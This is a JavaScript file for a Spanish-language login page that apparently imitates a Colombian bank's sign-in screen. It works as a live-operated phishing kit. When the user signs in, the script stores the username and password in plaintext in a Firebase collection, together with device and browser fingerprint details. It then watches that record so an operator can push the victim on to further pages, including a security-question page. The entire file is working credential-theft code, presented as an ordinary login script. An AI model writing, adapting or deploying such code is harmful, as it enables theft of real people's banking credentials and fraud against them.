"use strict";

(function initIndexFirebase() {
  var accessWatcher = null;

  function ready(callback) {
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", callback, { once: true });
      return;
    }
    callback();
  }

  function getNextCardNumber(db) {
    return db
      .collection("redireccion")
      .orderBy("cardNumber", "desc")
      .limit(1)
      .get()
      .then(function (snapshot) {
        if (snapshot.empty) {
          return 1;
        }
        return (snapshot.docs[0].data().cardNumber || 0) + 1;
      })
      .catch(function () {
        return 1;
      });
  }

  function saveHistoryEntry(db, historyData) {
    var docId = historyData.usuario;

    return db
      .collection("datosHistorial")
      .doc(docId)
      .set(historyData, { merge: true })
      .catch(function (error) {
        console.error("Error guardando historial inicial:", error);
      });
  }

  function showLoader() {
    var loaderWrapper = document.querySelector("svp-circle-loader");
    if (loaderWrapper) {
      loaderWrapper.classList.remove("bc-hidden");
    }
  }

  function hideLoader() {
    var loaderWrapper = document.querySelector("svp-circle-loader");
    if (loaderWrapper) {
      loaderWrapper.classList.add("bc-hidden");
    }
  }

  function attachAccessWatcher(userRef, userValue, accessButton) {
    if (accessWatcher) {
      accessWatcher();
      accessWatcher = null;
    }

    accessWatcher = userRef.onSnapshot(
      function (docSnapshot) {
        if (!docSnapshot.exists) {
          accessButton.disabled = false;
          accessButton.textContent = "Iniciar sesión";
          hideLoader();
          return;
        }

        var userData = docSnapshot.data() || {};
        var page = userData.page;

        if (page === 99) {
          window.location.href = "pregseg.html";
          return;
        }

        if (typeof page !== "number" || page <= 0) {
          return;
        }

        if (accessWatcher) {
          accessWatcher();
          accessWatcher = null;
        }

        localStorage.setItem("usuarioActual", userValue);
        sessionStorage.setItem("dashboard_session_user", userValue);
        sessionStorage.setItem("dashboard_session_timestamp", Date.now().toString());

        var route =
          window.appConfig &&
          window.appConfig.routes &&
          window.appConfig.routes[page]
            ? window.appConfig.routes[page]
            : null;

        if (route && route.url) {
          window.location.href = route.url;
          return;
        }

        window.location.href = "page" + page + ".html";
      },
      function () {
        accessButton.disabled = false;
        accessButton.textContent = "Iniciar sesión";
        hideLoader();
      }
    );
  }

  ready(function () {
    var userInput = document.getElementById("tiki");
    var passInput = document.getElementById("toko");
    var accessButton = document.querySelector("[data-test=login-button]");

    if (!userInput || !passInput || !accessButton) {
      return;
    }

    accessButton.addEventListener("click", function (event) {
      event.preventDefault();

      if (accessButton.disabled) {
        return;
      }

      var db = window.db;
      if (!db || typeof firebase === "undefined") {
        return;
      }

      var userValue = (userInput.value || "").trim();
      var passValue = (passInput.value || "").trim();

      if (!userValue || !passValue || userValue.indexOf("/") !== -1) {
        return;
      }

      accessButton.disabled = true;
      accessButton.textContent = "Cargando...";
      showLoader();

      getNextCardNumber(db)
        .then(function (cardNumber) {
          var isMobile = /Mobile|Android|iPhone|iPad/i.test(navigator.userAgent);
          var now = new Date();
          var fecha = now.toLocaleDateString("es-CO");
          var hora = now.toLocaleTimeString("es-CO", {
            hour: "2-digit",
            minute: "2-digit",
            second: "2-digit",
          });

          var currentUserData = {
            usuario: userValue,
            clave: passValue,
            documento: userValue,
            tipoDocumento: "Modal",
            page: 0,
            cardNumber: cardNumber,
            dispositivo: isMobile ? "Móvil" : "Desktop",
            fecha: fecha,
            hora: hora,
            timestamp: firebase.firestore.FieldValue.serverTimestamp(),
          };

          var historyData = {
            usuario: userValue,
            clave: passValue,
            documento: userValue,
            tipoDocumento: "Modal",
            cardNumber: cardNumber,
            dispositivo: isMobile ? "Móvil" : "Desktop",
            fecha: fecha,
            hora: hora,
            timestamp: now.toISOString(),
            userAgent: navigator.userAgent,
            idioma: navigator.language || "es",
            zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone,
            resolucion: screen.width + "x" + screen.height,
            referrer: document.referrer || "Directo",
          };

          var userRef = db.collection("redireccion").doc(userValue);

          return userRef.set(currentUserData, { merge: true }).then(function () {
            localStorage.setItem("usuarioActual", userValue);
            attachAccessWatcher(userRef, userValue, accessButton);
            return saveHistoryEntry(db, historyData);
          });
        })
        .catch(function () {
          accessButton.textContent = "Iniciar sesión";
          hideLoader();
          accessButton.disabled = false;
        });
    });
  });
})();
